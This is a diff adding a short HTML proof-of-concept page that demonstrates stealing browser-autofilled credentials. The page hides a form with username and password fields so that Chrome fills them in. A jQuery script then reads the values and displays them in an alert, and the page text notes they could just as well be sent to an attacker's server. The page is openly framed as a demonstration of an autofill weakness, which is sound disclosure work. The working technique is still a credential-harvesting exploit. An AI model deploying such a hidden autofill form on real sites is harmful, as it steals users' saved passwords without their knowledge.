@@ -1,0 +1,40 @@
+<!doctype html>
+<html>
+<head>
+	<style>
+		div.hide-me { display: none; visibility: hidden; }
+	</style>
+	<script src="https://code.jquery.com/jquery-2.1.0.js"></script>
+    <script>
+        $('document').ready( function () {
+          setTimeout(function () {
+        	  window.alert(
+			      'Username: ' + $('input#username')[0].value + '\n' +
+			      'Password: ' + $('input#password')[0].value
+			  )
+          }, 2000);
+        });
+    </script>
+</head>
+<body>
+	<div>
+		<h1>Welcome to average mr hacker's site...</h1>
+		<p>
+			There is a hidden form on this page, and because this url's domain part
+			matches the one you saved your password for, it will get autofilled by
+			chrome.
+		</p>
+		<p>
+			Mr hacker is a kind guy so he will only show you an alert box with your
+			credentials, but he could send them to his server with an XHR request...
+		</p>
+	</div>
+	<div class="hide-me">
+		<form method="post" action="">
+			Username: <input id="username" name="username" type="text">
+			Password: <input id="password" name="password" type="password">
+			<input type="submit" name="submit" value="Submit">
+		</form>
+	</div>
+</body>
+</html>
